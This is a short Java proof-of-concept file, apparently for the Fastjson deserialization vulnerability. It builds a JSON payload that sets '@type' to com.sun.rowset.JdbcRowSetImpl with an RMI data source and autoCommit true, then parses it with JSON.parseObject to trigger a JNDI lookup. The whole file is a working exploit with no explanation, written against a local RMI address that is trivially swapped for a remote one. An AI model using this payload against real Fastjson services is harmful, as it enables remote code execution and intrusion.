import com.alibaba.fastjson.JSON;

public class fastjsonPoc {

    public static void JdbcRowSetImplTrriger(){
        //jdk8以下版本
        String payload="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/object\"," +
                "\"autoCommit\":true}";
        JSON.parseObject(payload);
    }
    public static void main(String args[]){
        try {
            JdbcRowSetImplTrriger();
            //test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}